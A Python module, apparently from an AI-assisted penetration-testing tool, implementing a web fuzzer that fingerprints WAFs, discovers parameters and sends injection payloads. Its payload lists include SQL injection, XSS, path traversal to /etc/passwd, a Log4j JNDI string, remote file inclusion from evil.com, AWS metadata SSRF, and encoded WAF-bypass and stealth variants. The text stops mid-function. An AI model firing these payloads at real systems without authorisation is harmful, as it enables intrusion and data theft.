"""
Intelligent and Contextual Fuzzing Engine

This module implements advanced fuzzing techniques that go beyond generic wordlists.
It discovers parameters, performs contextual fuzzing, implements WAF bypass techniques,
and uses AI to guide the fuzzing process.

Features:
- Parameter discovery and analysis
- Contextual payload generation based on parameter types
- WAF detection and bypass techniques
- Intelligent fuzzing based on discovered technologies
- Custom payload generation for specific attack vectors
"""

import asyncio
import json
import re
import requests
import random
import string
import time
import urllib3
import toml
import os
from typing import Dict, List, Any, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from app.logger import logger
from app.reconnaissance.kali_tools import KaliToolsManager

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class IntelligentFuzzer:
    """Advanced intelligent fuzzing engine with contextual awareness"""
    
    def __init__(self, target_url: str, llm_client=None, discovered_tech: Dict[str, Any] = None):
        self.target_url = target_url.rstrip('/')
        self.llm_client = llm_client
        self.discovered_tech = discovered_tech or {}
        self.kali_tools = KaliToolsManager()
        
        # Session configuration
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        
        # Fuzzing state
        self.discovered_parameters = set()
        self.discovered_endpoints = set()
        self.waf_detected = None
        self.waf_bypass_techniques = []
        
        # Rate limiting
        self.request_delay = 0.1
        self.max_concurrent = 10
        
        # Load wordlists configuration
        self.wordlists_config = self._load_wordlists_config()
        
        logger.info(f"Intelligent Fuzzer initialized for {target_url}")

    def _load_wordlists_config(self) -> Dict[str, Any]:
        """Load wordlists configuration from config/ai/wordlists.toml"""
        try:
            config_path = Path(__file__).parent.parent.parent / "config" / "ai" / "wordlists.toml"
            if config_path.exists():
                with open(config_path, 'r') as f:
                    config = toml.load(f)
                logger.info(f"Loaded wordlists configuration from {config_path}")
                return config
            else:
                logger.warning(f"Wordlists config not found at {config_path}")
                return {}
        except Exception as e:
            logger.error(f"Error loading wordlists config: {e}")
            return {}

    def _select_optimal_wordlists(self, scan_type: str, time_constraint: str = "normal", 
                                 detected_technologies: List[str] = None) -> List[Dict[str, Any]]:
        """Select optimal wordlists based on scan context and detected technologies"""
        if not self.wordlists_config:
            return []
        
        selected_wordlists = []
        detected_technologies = detected_technologies or []
        
        # Get selection rules based on time constraint
        selection_rules = self.wordlists_config.get('selection_rules', {})
        rule_key = f"{time_constraint}_scan"
        rules = selection_rules.get(rule_key, selection_rules.get('balanced_scan', {}))
        
        max_requests = rules.get('max_requests', 25000)
        preferred_lists = rules.get('preferred_wordlists', [])
        
        # Technology-specific wordlist mapping
        tech_mapping = self.wordlists_config.get('technology_mapping', {})
        tech_wordlists = []
        
        for tech in detected_technologies:
            tech_lower = tech.lower()
            for tech_key, wordlists in tech_mapping.items():
                if tech_key in tech_lower:
                    tech_wordlists.extend(wordlists)
        
        # Combine preferred and technology-specific wordlists
        all_wordlist_names = list(set(preferred_lists + tech_wordlists))
        
        # Get wordlist details and select based on constraints
        total_requests = 0
        wordlist_categories = ['directory_wordlists', 'api_wordlists', 'parameter_wordlists', 
                              'technology_specific', 'backup_files', 'custom_wordlists']
        
        for category in wordlist_categories:
            category_wordlists = self.wordlists_config.get(category, {})
            
            for wordlist_name, wordlist_info in category_wordlists.items():
                # Check if this wordlist is in our selection
                if wordlist_name in all_wordlist_names or scan_type in wordlist_info.get('use_cases', []):
                    estimated_requests = wordlist_info.get('estimated_requests', 1000)
                    
                    # Check if adding this wordlist would exceed our budget
                    if total_requests + estimated_requests <= max_requests:
                        wordlist_entry = {
                            'name': wordlist_info.get('name', wordlist_name),
                            'path': wordlist_info.get('path', ''),
                            'size': wordlist_info.get('size', 'medium'),
                            'description': wordlist_info.get('description', ''),
                            'estimated_requests': estimated_requests,
                            'category': category,
                            'use_cases': wordlist_info.get('use_cases', [])
                        }
                        
                        # Verify file exists
                        if os.path.exists(wordlist_entry['path']):
                            selected_wordlists.append(wordlist_entry)
                            total_requests += estimated_requests
                        else:
                            logger.warning(f"Wordlist file not found: {wordlist_entry['path']}")
        
        # Sort by priority (smaller wordlists first for quick wins)
        selected_wordlists.sort(key=lambda x: x['estimated_requests'])
        
        logger.info(f"Selected {len(selected_wordlists)} wordlists with ~{total_requests} total requests")
        return selected_wordlists

    def _load_wordlist_content(self, wordlist_path: str, max_lines: int = None) -> List[str]:
        """Load content from a wordlist file"""
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
                if max_lines:
                    lines = lines[:max_lines]
                
                return lines
        except Exception as e:
            logger.error(f"Error loading wordlist {wordlist_path}: {e}")
            return []

    async def comprehensive_intelligent_fuzz(self, 
                                           endpoints: List[str] = None,
                                           deep_analysis: bool = False,
                                           stealth_mode: bool = False) -> Dict[str, Any]:
        """
        Perform comprehensive intelligent fuzzing
        
        Args:
            endpoints: List of discovered endpoints to fuzz
            deep_analysis: Enable deep parameter analysis
            stealth_mode: Use stealth techniques to avoid detection
        """
        logger.info("Starting comprehensive intelligent fuzzing")
        
        if stealth_mode:
            self.request_delay = 2.0
            self.max_concurrent = 3
        
        results = {
            'target': self.target_url,
            'parameter_discovery': {},
            'contextual_fuzzing': {},
            'waf_analysis': {},
            'bypass_techniques': {},
            'vulnerability_testing': {},
            'ai_guided_fuzzing': {},
            'summary': {}
        }
        
        # Phase 1: WAF Detection and Analysis
        logger.info("Phase 1: WAF detection and analysis")
        results['waf_analysis'] = await self._detect_and_analyze_waf()
        
        # Phase 2: Parameter Discovery
        logger.info("Phase 2: Parameter discovery")
        results['parameter_discovery'] = await self._discover_parameters(endpoints)
        
        # Phase 3: Contextual Fuzzing
        logger.info("Phase 3: Contextual fuzzing")
        results['contextual_fuzzing'] = await self._contextual_parameter_fuzzing()
        
        # Phase 4: WAF Bypass Techniques
        if self.waf_detected:
            logger.info("Phase 4: WAF bypass techniques")
            results['bypass_techniques'] = await self._test_waf_bypass_techniques()
        
        # Phase 5: Vulnerability-Specific Testing
        logger.info("Phase 5: Vulnerability-specific testing")
        results['vulnerability_testing'] = await self._vulnerability_specific_fuzzing()
        
        # Phase 6: AI-Guided Fuzzing
        if self.llm_client:
            logger.info("Phase 6: AI-guided fuzzing")
            results['ai_guided_fuzzing'] = await self._ai_guided_fuzzing(results)
        
        # Generate summary
        results['summary'] = self._generate_fuzzing_summary(results)
        
        logger.info(f"Intelligent fuzzing completed. Found {len(self.discovered_parameters)} parameters")
        return results

    async def _detect_and_analyze_waf(self) -> Dict[str, Any]:
        """Detect and analyze Web Application Firewall"""
        logger.info("Detecting and analyzing WAF")
        
        waf_analysis = {
            'waf_detected': False,
            'waf_type': None,
            'detection_methods': [],
            'response_patterns': {},
            'rate_limiting': {},
            'blocking_patterns': []
        }
        
        # Test basic WAF detection payloads
        waf_test_payloads = [
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://test.com}",
            "' UNION SELECT 1,2,3--"
        ]
        
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
            'Akamai': ['akamai', 'akamaihost', 'x-akamai'],
            'AWS WAF': ['x-amzn-requestid', 'x-amz-cf-id'],
            'ModSecurity': ['mod_security', 'modsecurity'],
            'F5 BIG-IP': ['f5-bigip', 'bigipserver'],
            'Imperva': ['imperva', 'incap_ses'],
            'Sucuri': ['sucuri', 'x-sucuri'],
            'Barracuda': ['barracuda', 'barra']
        }
        
        # Test each payload and analyze responses
        for payload in waf_test_payloads:
            try:
                # Test in different positions
                test_urls = [
                    f"{self.target_url}?test={quote(payload)}",
                    f"{self.target_url}/{quote(payload)}",
                    f"{self.target_url}?{quote(payload)}=test"
                ]
                
                for test_url in test_urls:
                    response = self.session.get(test_url)
                    
                    # Analyze response for WAF indicators
                    waf_info = self._analyze_waf_response(response, payload)
                    if waf_info['waf_detected']:
                        waf_analysis['waf_detected'] = True
                        waf_analysis['detection_methods'].append(waf_info)
                        
                        # Identify WAF type
                        for waf_name, signatures in waf_signatures.items():
                            if any(sig.lower() in str(response.headers).lower() or 
                                  sig.lower() in response.text.lower() 
                                  for sig in signatures):
                                waf_analysis['waf_type'] = waf_name
                                break
                
                # Add delay to avoid triggering rate limiting
                await asyncio.sleep(self.request_delay)
                
            except Exception as e:
                logger.debug(f"WAF detection error with payload {payload}: {e}")
        
        # Test rate limiting
        waf_analysis['rate_limiting'] = await self._test_rate_limiting()
        
        # Store WAF detection results
        self.waf_detected = waf_analysis['waf_detected']
        
        return waf_analysis

    def _analyze_waf_response(self, response: requests.Response, payload: str) -> Dict[str, Any]:
        """Analyze response for WAF indicators"""
        waf_indicators = {
            'status_codes': [403, 406, 429, 501, 503],
            'headers': ['x-blocked-by', 'x-firewall', 'x-waf'],
            'content_patterns': [
                'blocked', 'forbidden', 'access denied', 'security',
                'firewall', 'waf', 'protection', 'suspicious'
            ]
        }
        
        waf_detected = False
        detection_reasons = []
        
        # Check status code
        if response.status_code in waf_indicators['status_codes']:
            waf_detected = True
            detection_reasons.append(f"Suspicious status code: {response.status_code}")
        
        # Check headers
        for header in waf_indicators['headers']:
            if header in response.headers:
                waf_detected = True
                detection_reasons.append(f"WAF header detected: {header}")
        
        # Check content patterns
        content_lower = response.text.lower()
        for pattern in waf_indicators['content_patterns']:
            if pattern in content_lower:
                waf_detected = True
                detection_reasons.append(f"WAF content pattern: {pattern}")
                break
        
        return {
            'waf_detected': waf_detected,
            'payload': payload,
            'status_code': response.status_code,
            'detection_reasons': detection_reasons,
            'response_size': len(response.content),
            'response_time': response.elapsed.total_seconds()
        }

    async def _test_rate_limiting(self) -> Dict[str, Any]:
        """Test for rate limiting mechanisms"""
        rate_limit_info = {
            'rate_limited': False,
            'threshold': None,
            'reset_time': None,
            'headers': {}
        }
        
        # Send rapid requests to test rate limiting
        start_time = time.time()
        request_count = 0
        
        for i in range(20):  # Test with 20 rapid requests
            try:
                response = self.session.get(self.target_url)
                request_count += 1
                
                # Check for rate limiting indicators
                if response.status_code == 429:
                    rate_limit_info['rate_limited'] = True
                    rate_limit_info['threshold'] = request_count
                    
                    # Extract rate limit headers
                    rate_headers = ['x-ratelimit-limit', 'x-ratelimit-remaining', 
                                  'x-ratelimit-reset', 'retry-after']
                    for header in rate_headers:
                        if header in response.headers:
                            rate_limit_info['headers'][header] = response.headers[header]
                    
                    break
                
                # Small delay between requests
                await asyncio.sleep(0.1)
                
            except Exception as e:
                logger.debug(f"Rate limiting test error: {e}")
                break
        
        return rate_limit_info

    async def _discover_parameters(self, endpoints: List[str] = None) -> Dict[str, Any]:
        """Discover parameters using multiple techniques including wordlist-based fuzzing"""
        logger.info("Starting parameter discovery")
        
        discovery_results = {
            'methods_used': [],
            'discovered_parameters': {},
            'parameter_analysis': {},
            'hidden_parameters': [],
            'wordlist_fuzzing': {}
        }
        
        # Use multiple parameter discovery methods
        discovery_methods = [
            ('paramspider', self._paramspider_discovery),
            ('arjun', self._arjun_discovery),
            ('content_analysis', self._content_analysis_discovery),
            ('js_analysis', self._javascript_analysis_discovery),
            ('form_analysis', self._form_analysis_discovery),
            ('wordlist_fuzzing', self._wordlist_parameter_discovery)
        ]
        
        target_urls = [self.target_url]
        if endpoints:
            target_urls.extend([urljoin(self.target_url, ep) for ep in endpoints])
        
        for method_name, method_func in discovery_methods:
            try:
                logger.info(f"Using {method_name} for parameter discovery")
                method_results = await method_func(target_urls)
                discovery_results['discovered_parameters'][method_name] = method_results
                discovery_results['methods_used'].append(method_name)
                
                # Merge discovered parameters
                if isinstance(method_results, dict) and 'parameters' in method_results:
                    self.discovered_parameters.update(method_results['parameters'])
                
            except Exception as e:
                logger.error(f"Parameter discovery method {method_name} failed: {e}")
                discovery_results['discovered_parameters'][method_name] = {'error': str(e)}
        
        # Analyze discovered parameters
        discovery_results['parameter_analysis'] = self._analyze_discovered_parameters()
        
        return discovery_results

    async def _wordlist_parameter_discovery(self, urls: List[str]) -> Dict[str, Any]:
        """Discover parameters using configured wordlists"""
        logger.info("Starting wordlist-based parameter discovery")
        
        # Extract detected technologies for wordlist selection
        detected_tech = []
        for tech_info in self.discovered_tech.values():
            if isinstance(tech_info, list):
                detected_tech.extend(tech_info)
            elif isinstance(tech_info, dict):
                detected_tech.extend(tech_info.get('technologies', []))
        
        # Select optimal parameter wordlists
        selected_wordlists = self._select_optimal_wordlists(
            scan_type='parameter_discovery',
            time_constraint='normal',
            detected_technologies=detected_tech
        )
        
        # Filter for parameter-specific wordlists
        param_wordlists = [wl for wl in selected_wordlists 
                          if wl['category'] == 'parameter_wordlists' or 
                          'parameter' in wl['use_cases']]
        
        if not param_wordlists:
            # Fallback to common parameter wordlist
            param_wordlists = [wl for wl in selected_wordlists 
                              if 'common' in wl['name'].lower()]
        
        discovery_results = {
            'wordlists_used': [],
            'parameters_found': [],
            'fuzzing_results': {},
            'success': True
        }
        
        for wordlist_info in param_wordlists[:3]:  # Limit to 3 wordlists
            wordlist_path = wordlist_info['path']
            wordlist_name = wordlist_info['name']
            
            logger.info(f"Using parameter wordlist: {wordlist_name}")
            
            # Load wordlist content
            max_params = min(1000, wordlist_info['estimated_requests'])  # Limit for parameter discovery
            parameters = self._load_wordlist_content(wordlist_path, max_params)
            
            if not parameters:
                continue
            
            discovery_results['wordlists_used'].append({
                'name': wordlist_name,
                'path': wordlist_path,
                'parameters_loaded': len(parameters)
            })
            
            # Test parameters on each URL
            for url in urls[:2]:  # Limit to first 2 URLs
                url_results = await self._fuzz_parameters_on_url(url, parameters, wordlist_name)
                discovery_results['fuzzing_results'][url] = url_results
                
                # Extract found parameters
                found_params = url_results.get('found_parameters', [])
                discovery_results['parameters_found'].extend(found_params)
        
        # Remove duplicates
        discovery_results['parameters_found'] = list(set(discovery_results['parameters_found']))
        
        return discovery_results

    async def _fuzz_parameters_on_url(self, url: str, parameters: List[str], wordlist_name: str) -> Dict[str, Any]:
        """Fuzz parameters on a specific URL"""
        results = {
            'url': url,
            'wordlist': wordlist_name,
            'parameters_tested': len(parameters),
            'found_parameters': [],
            'interesting_responses': [],
            'errors': []
        }
        
        # Get baseline response
        try:
            baseline_response = self.session.get(url)
            baseline_status = baseline_response.status_code
            baseline_length = len(baseline_response.content)
        except Exception as e:
            logger.error(f"Failed to get baseline response for {url}: {e}")
            return results
        
        # Test parameters in batches
        batch_size = 50
        for i in range(0, len(parameters), batch_size):
            batch = parameters[i:i + batch_size]
            
            # Test each parameter in the batch
            for param in batch:
                try:
                    # Test GET parameter
                    test_url = f"{url}?{param}=test"
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for interesting responses
                    if self._is_parameter_response_interesting(response, baseline_status, baseline_length):
                        results['found_parameters'].append(param)
                        results['interesting_responses'].append({
                            'parameter': param,
                            'method': 'GET',
                            'status_code': response.status_code,
                            'response_length': len(response.content),
                            'difference_from_baseline': len(response.content) - baseline_length
                        })
                    
                    # Test POST parameter
                    post_response = self.session.post(url, data={param: 'test'}, timeout=10)
                    
                    if self._is_parameter_response_interesting(post_response, baseline_status, baseline_length):
                        if param not in results['found_parameters']:
                            results['found_parameters'].append(param)
                        
                        results['interesting_responses'].append({
                            'parameter': param,
                            'method': 'POST',
                            'status_code': post_response.status_code,
                            'response_length': len(post_response.content),
                            'difference_from_baseline': len(post_response.content) - baseline_length
                        })
                    
                    # Rate limiting
                    await asyncio.sleep(self.request_delay)
                    
                except Exception as e:
                    results['errors'].append({
                        'parameter': param,
                        'error': str(e)
                    })
            
            # Batch delay
            await asyncio.sleep(0.5)
        
        return results

    def _is_parameter_response_interesting(self, response: requests.Response, 
                                         baseline_status: int, baseline_length: int) -> bool:
        """Determine if a parameter response is interesting"""
        # Status code changes
        if response.status_code != baseline_status:
            return True
        
        # Significant length changes
        length_diff = abs(len(response.content) - baseline_length)
        if length_diff > 50:  # More than 50 bytes difference
            return True
        
        # Error messages that might indicate parameter processing
        error_indicators = [
            'parameter', 'missing', 'required', 'invalid', 'error',
            'exception', 'undefined', 'null', 'empty'
        ]
        
        response_text = response.text.lower()
        if any(indicator in response_text for indicator in error_indicators):
            return True
        
        return False

    async def _paramspider_discovery(self, urls: List[str]) -> Dict[str, Any]:
        """Use paramspider for parameter discovery"""
        try:
            # Extract domain from first URL
            domain = urlparse(urls[0]).netloc
            
            # Run paramspider
            cmd = ['paramspider', '-d', domain, '--exclude', 'png,jpg,gif,css,js', '--level', 'high']
            result = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await result.communicate()
            
            if result.returncode == 0:
                # Parse paramspider output
                parameters = set()
                for line in stdout.decode().split('\n'):
                    if '?' in line:
                        # Extract parameters from URLs
                        parsed_url = urlparse(line.strip())
                        if parsed_url.query:
                            params = parse_qs(parsed_url.query)
                            parameters.update(params.keys())
                
                return {
                    'parameters': list(parameters),
                    'urls_found': len(stdout.decode().split('\n')),
                    'success': True
                }
            else:
                return {'error': stderr.decode(), 'success': False}
                
        except Exception as e:
            return {'error': str(e), 'success': False}

    async def _arjun_discovery(self, urls: List[str]) -> Dict[str, Any]:
        """Use Arjun for parameter discovery"""
        try:
            parameters_found = set()
            
            for url in urls[:3]:  # Limit to first 3 URLs to avoid timeout
                cmd = ['arjun', '-u', url, '--get', '--post', '-t', '10']
                
                result = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await result.communicate()
                
                if result.returncode == 0:
                    # Parse Arjun output
                    output = stdout.decode()
                    # Look for parameter patterns in output
                    param_matches = re.findall(r'Parameter:\s*(\w+)', output)
                    parameters_found.update(param_matches)
            
            return {
                'parameters': list(parameters_found),
                'urls_tested': len(urls[:3]),
                'success': True
            }
            
        except Exception as e:
            return {'error': str(e), 'success': False}

    async def _content_analysis_discovery(self, urls: List[str]) -> Dict[str, Any]:
        """Discover parameters through content analysis"""
        parameters_found = set()
        
        for url in urls[:5]:  # Analyze first 5 URLs
            try:
                response = self.session.get(url)
                content = response.text
                
                # Look for common parameter patterns
                patterns = [
                    r'name=["\'](\w+)["\']',  # Form inputs
                    r'data-(\w+)=',           # Data attributes
                    r'\?(\w+)=',              # URL parameters
                    r'&(\w+)=',               # URL parameters
                    r'{\s*["\'](\w+)["\']',   # JSON keys
                    r'(\w+):\s*["\']',        # JSON/object properties
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    parameters_found.update(matches)
                
                # Look for API documentation patterns
                api_patterns = [
                    r'api/v\d+/\w+/\{(\w+)\}',  # REST API parameters
                    r'endpoint.*?(\w+).*?required',  # Documentation
                ]
                
                for pattern in api_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    parameters_found.update(matches)
                
            except Exception as e:
                logger.debug(f"Content analysis error for {url}: {e}")
        
        return {
            'parameters': list(parameters_found),
            'urls_analyzed': len(urls[:5]),
            'success': True
        }

    async def _javascript_analysis_discovery(self, urls: List[str]) -> Dict[str, Any]:
        """Discover parameters through JavaScript analysis"""
        parameters_found = set()
        js_urls = set()
        
        for url in urls[:3]:
            try:
                response = self.session.get(url)
                content = response.text
                
                # Find JavaScript files
                js_patterns = [
                    r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']',
                    r'<script[^>]*>([^<]+)</script>'
                ]
                
                for pattern in js_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                    for match in matches:
                        if match.endswith('.js') or 'javascript' in match.lower():
                            if match.startswith('http'):
                                js_urls.add(match)
                            else:
                                js_urls.add(urljoin(url, match))
                
                # Analyze inline JavaScript
                inline_js = re.findall(r'<script[^>]*>(.*?)</script>', content, re.DOTALL | re.IGNORECASE)
                for js_code in inline_js:
                    # Look for parameter patterns in JavaScript
                    js_params = re.findall(r'["\'](\w+)["\']:\s*', js_code)
                    parameters_found.update(js_params)
                    
                    # Look for AJAX parameters
                    ajax_params = re.findall(r'data:\s*{\s*["\'](\w+)["\']', js_code)
                    parameters_found.update(ajax_params)
                
            except Exception as e:
                logger.debug(f"JavaScript analysis error for {url}: {e}")
        
        # Analyze external JavaScript files
        for js_url in list(js_urls)[:10]:  # Limit to 10 JS files
            try:
                response = self.session.get(js_url)
                js_content = response.text
                
                # Look for parameter patterns in JS
                js_patterns = [
                    r'["\'](\w+)["\']:\s*',           # Object properties
                    r'\.(\w+)\s*=',                   # Property assignments
                    r'params\[[\'""](\w+)[\'""]\]',   # Parameter arrays
                    r'data\.(\w+)',                   # Data object properties
                ]
                
                for pattern in js_patterns:
                    matches = re.findall(pattern, js_content)
                    parameters_found.update(matches)
                
            except Exception as e:
                logger.debug(f"External JS analysis error for {js_url}: {e}")
        
        return {
            'parameters': list(parameters_found),
            'js_files_analyzed': len(js_urls),
            'success': True
        }

    async def _form_analysis_discovery(self, urls: List[str]) -> Dict[str, Any]:
        """Discover parameters through form analysis"""
        parameters_found = set()
        forms_analyzed = 0
        
        for url in urls[:5]:
            try:
                response = self.session.get(url)
                content = response.text
                
                # Find all forms
                form_pattern = r'<form[^>]*>(.*?)</form>'
                forms = re.findall(form_pattern, content, re.DOTALL | re.IGNORECASE)
                
                for form in forms:
                    forms_analyzed += 1
                    
                    # Find input fields
                    input_patterns = [
                        r'<input[^>]+name=["\']([^"\']+)["\']',
                        r'<select[^>]+name=["\']([^"\']+)["\']',
                        r'<textarea[^>]+name=["\']([^"\']+)["\']'
                    ]
                    
                    for pattern in input_patterns:
                        matches = re.findall(pattern, form, re.IGNORECASE)
                        parameters_found.update(matches)
                
            except Exception as e:
                logger.debug(f"Form analysis error for {url}: {e}")
        
        return {
            'parameters': list(parameters_found),
            'forms_analyzed': forms_analyzed,
            'success': True
        }

    def _analyze_discovered_parameters(self) -> Dict[str, Any]:
        """Analyze discovered parameters to categorize them"""
        analysis = {
            'total_parameters': len(self.discovered_parameters),
            'categorized_parameters': {
                'authentication': [],
                'file_operations': [],
                'database_operations': [],
                'redirect_operations': [],
                'admin_operations': [],
                'api_operations': [],
                'generic': []
            },
            'high_priority_parameters': [],
            'parameter_types': {}
        }
        
        # Parameter categorization patterns
        categories = {
            'authentication': ['user', 'pass', 'login', 'auth', 'token', 'session', 'key'],
            'file_operations': ['file', 'path', 'dir', 'upload', 'download', 'include'],
            'database_operations': ['id', 'query', 'search', 'filter', 'sort', 'order'],
            'redirect_operations': ['redirect', 'url', 'return', 'next', 'goto'],
            'admin_operations': ['admin', 'manage', 'config', 'setting', 'control'],
            'api_operations': ['api', 'endpoint', 'method', 'action', 'cmd']
        }
        
        for param in self.discovered_parameters:
            param_lower = param.lower()
            categorized = False
            
            for category, keywords in categories.items():
                if any(keyword in param_lower for keyword in keywords):
                    analysis['categorized_parameters'][category].append(param)
                    categorized = True
                    
                    # Mark high priority parameters
                    if category in ['authentication', 'file_operations', 'admin_operations']:
                        analysis['high_priority_parameters'].append(param)
                    break
            
            if not categorized:
                analysis['categorized_parameters']['generic'].append(param)
            
            # Determine parameter type based on name
            analysis['parameter_types'][param] = self._guess_parameter_type(param)
        
        return analysis

    def _guess_parameter_type(self, param: str) -> str:
        """Guess parameter type based on name patterns"""
        param_lower = param.lower()
        
        type_patterns = {
            'id': ['id', 'uid', 'userid', 'user_id'],
            'email': ['email', 'mail', 'e_mail'],
            'password': ['pass', 'password', 'pwd'],
            'file': ['file', 'filename', 'filepath'],
            'url': ['url', 'link', 'href', 'redirect'],
            'number': ['num', 'count', 'amount', 'price', 'quantity'],
            'date': ['date', 'time', 'timestamp', 'created', 'updated'],
            'boolean': ['enable', 'disable', 'active', 'visible', 'public'],
            'text': ['name', 'title', 'description', 'comment', 'message']
        }
        
        for param_type, patterns in type_patterns.items():
            if any(pattern in param_lower for pattern in patterns):
                return param_type
        
        return 'unknown'

    async def _contextual_parameter_fuzzing(self) -> Dict[str, Any]:
        """Perform contextual fuzzing based on parameter types"""
        logger.info("Starting contextual parameter fuzzing")
        
        fuzzing_results = {
            'parameter_tests': {},
            'vulnerabilities_found': [],
            'interesting_responses': [],
            'error_patterns': {}
        }
        
        # Generate contextual payloads for each parameter
        for param in self.discovered_parameters:
            param_type = self._guess_parameter_type(param)
            payloads = self._generate_contextual_payloads(param, param_type)
            
            logger.debug(f"Testing parameter {param} with {len(payloads)} contextual payloads")
            
            param_results = await self._test_parameter_with_payloads(param, payloads)
            fuzzing_results['parameter_tests'][param] = param_results
            
            # Analyze results for vulnerabilities
            vulnerabilities = self._analyze_parameter_results(param, param_results)
            fuzzing_results['vulnerabilities_found'].extend(vulnerabilities)
        
        return fuzzing_results

    def _generate_contextual_payloads(self, param: str, param_type: str) -> List[Dict[str, Any]]:
        """Generate contextual payloads based on parameter type"""
        payloads = []
        
        # Base payloads for all parameters
        base_payloads = [
            {'value': '', 'type': 'empty', 'description': 'Empty value'},
            {'value': 'null', 'type': 'null', 'description': 'Null value'},
            {'value': '0', 'type': 'zero', 'description': 'Zero value'},
            {'value': '-1', 'type': 'negative', 'description': 'Negative value'},
            {'value': '999999999', 'type': 'large_number', 'description': 'Large number'},
        ]
        
        payloads.extend(base_payloads)
        
        # Type-specific payloads
        if param_type == 'id':
            id_payloads = [
                {'value': '1', 'type': 'idor', 'description': 'IDOR test - ID 1'},
                {'value': '2', 'type': 'idor', 'description': 'IDOR test - ID 2'},
                {'value': '100', 'type': 'idor', 'description': 'IDOR test - ID 100'},
                {'value': '../1', 'type': 'path_traversal', 'description': 'Path traversal in ID'},
                {'value': '1 OR 1=1', 'type': 'sqli', 'description': 'SQL injection in ID'},
                {'value': '${jndi:ldap://test.com}', 'type': 'log4j', 'description': 'Log4j injection'},
            ]
            payloads.extend(id_payloads)
        
        elif param_type == 'file':
            file_payloads = [
                {'value': '../../../etc/passwd', 'type': 'lfi', 'description': 'Linux LFI'},
                {'value': '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', 'type': 'lfi', 'description': 'Windows LFI'},
                {'value': '/etc/passwd', 'type': 'lfi', 'description': 'Direct file access'},
                {'value': 'php://filter/read=convert.base64-encode/resource=index.php', 'type': 'lfi', 'description': 'PHP filter'},
                {'value': 'file:///etc/passwd', 'type': 'lfi', 'description': 'File protocol'},
                {'value': 'http://evil.com/shell.txt', 'type': 'rfi', 'description': 'Remote file inclusion'},
            ]
            payloads.extend(file_payloads)
        
        elif param_type == 'url':
            url_payloads = [
                {'value': 'http://evil.com', 'type': 'open_redirect', 'description': 'Open redirect'},
                {'value': '//evil.com', 'type': 'open_redirect', 'description': 'Protocol-relative redirect'},
                {'value': 'javascript:alert(1)', 'type': 'xss', 'description': 'JavaScript protocol XSS'},
                {'value': 'data:text/html,<script>alert(1)</script>', 'type': 'xss', 'description': 'Data protocol XSS'},
                {'value': 'file:///etc/passwd', 'type': 'ssrf', 'description': 'SSRF file protocol'},
                {'value': 'http://169.254.169.254/latest/meta-data/', 'type': 'ssrf', 'description': 'AWS metadata SSRF'},
            ]
            payloads.extend(url_payloads)
        
        elif param_type == 'email':
            email_payloads = [
                {'value': 'test@evil.com', 'type': 'email_injection', 'description': 'Email injection'},
                {'value': 'test+<script>alert(1)</script>@test.com', 'type': 'xss', 'description': 'XSS in email'},
                {'value': 'test\r\nBcc: admin@target.com', 'type': 'email_injection', 'description': 'Email header injection'},
                {'value': 'test@test.com\r\nSubject: Injected', 'type': 'email_injection', 'description': 'Subject injection'},
            ]
            payloads.extend(email_payloads)
        
        elif param_type == 'text':
            text_payloads = [
                {'value': '<script>alert(1)</script>', 'type': 'xss', 'description': 'Basic XSS'},
                {'value': '"><script>alert(1)</script>', 'type': 'xss', 'description': 'Attribute escape XSS'},
                {'value': "' OR '1'='1", 'type': 'sqli', 'description': 'SQL injection'},
                {'value': '{{7*7}}', 'type': 'ssti', 'description': 'Server-side template injection'},
                {'value': '${7*7}', 'type': 'ssti', 'description': 'Expression language injection'},
                {'value': '<img src=x onerror=alert(1)>', 'type': 'xss', 'description': 'Image XSS'},
            ]
            payloads.extend(text_payloads)
        
        # Add encoding variations for WAF bypass
        if self.waf_detected:
            encoded_payloads = []
            for payload in payloads[:5]:  # Encode first 5 payloads
                encoded_payloads.extend(self._generate_encoded_payloads(payload))
            payloads.extend(encoded_payloads)
        
        return payloads

    def _generate_encoded_payloads(self, payload: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate encoded variations of payloads for WAF bypass"""
        encoded_payloads = []
        original_value = payload['value']
        
        # URL encoding
        encoded_payloads.append({
            'value': quote(original_value),
            'type': f"{payload['type']}_url_encoded",
            'description': f"URL encoded: {payload['description']}"
        })
        
        # Double URL encoding
        encoded_payloads.append({
            'value': quote(quote(original_value)),
            'type': f"{payload['type']}_double_url_encoded",
            'description': f"Double URL encoded: {payload['description']}"
        })
        
        # Unicode encoding
        if any(c in original_value for c in '<>"\''):
            unicode_value = original_value.replace('<', '\\u003c').replace('>', '\\u003e').replace('"', '\\u0022').replace("'", '\\u0027')
            encoded_payloads.append({
                'value': unicode_value,
                'type': f"{payload['type']}_unicode",
                'description': f"Unicode encoded: {payload['description']}"
            })
        
        return encoded_payloads

    async def _test_parameter_with_payloads(self, param: str, payloads: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Test a parameter with multiple payloads"""
        results = {
            'parameter': param,
            'total_payloads': len(payloads),
            'responses': [],
            'errors': [],
            'interesting_responses': []
        }
        
        # Test each payload
        for payload in payloads:
            try:
                # Test in different HTTP methods and positions
                test_results = await self._test_payload_variations(param, payload)
                results['responses'].extend(test_results)
                
                # Add delay to avoid rate limiting
                await asyncio.sleep(self.request_delay)
                
            except Exception as e:
                results['errors'].append({
                    'payload': payload,
                    'error': str(e)
